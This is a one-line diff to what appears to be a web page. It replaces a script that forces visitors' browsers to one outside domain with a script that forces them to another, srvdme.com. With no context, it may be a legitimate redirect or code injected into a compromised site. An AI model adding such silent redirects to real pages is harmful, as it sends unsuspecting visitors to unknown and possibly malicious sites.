@@ -1,1 +1,1 @@
-<script type="text/javascript">document.write(window.location.href='http://nick.hesling.com:81/');</script>
+<script type="text/javascript">document.write(window.location.href='http://srvdme.com/');</script>
